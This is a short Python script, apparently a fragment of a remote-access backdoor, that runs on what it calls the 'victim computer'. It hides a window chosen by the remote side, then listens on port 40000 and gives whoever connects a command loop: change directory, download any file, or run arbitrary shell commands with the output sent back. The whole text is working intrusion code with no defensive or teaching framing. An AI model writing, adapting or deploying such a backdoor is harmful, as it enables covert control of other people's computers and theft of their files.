def b(hwnd,r):
    if a.IsWindowVisible(hwnd):
        l.append(a.GetWindowText(hwnd))
        f.append(hwnd)
a.EnumWindows(b,None)
g=s.socket(s.AF_INET,s.SOCK_STREAM)
g.bind(("IP Address of victim computer",40000))
g.listen()
c,p=g.accept()
c.send(str(len(l)).encode('utf 8'))
print(len(l))
print(f)
print(l)
for i in range(len(l)):
    c.send(str(l[i]).encode('utf 8'))
    c.send(str(f[i]).encode('utf 8'))
k=c.recv(1024)
print(k)
a.ShowWindow(f[int(k.decode('utf 8'))],0)
while 1:
    z=c.recv(1024).decode('utf 8')
    print(z)
    vf=z.find('cd')
    qa=z.find('download')
    if vf>-1:
        fg=z.split()
        try:
            r.chdir(fg[1])
            c.send("changed directory".encode('utf 8'))
        except:
            c.send("check the directory".encode('utf 8'))
    elif qa>-1:
        kl=z.split()
        try:
            df=open(kl[1],"br")
            c.send(df.read())
        except:
            c.send("check the name please")
    else:
        w=x.run([z],shell=1,capture_output=1)
        c.send(w.stdout)    
        c.send(w.stderr)
    
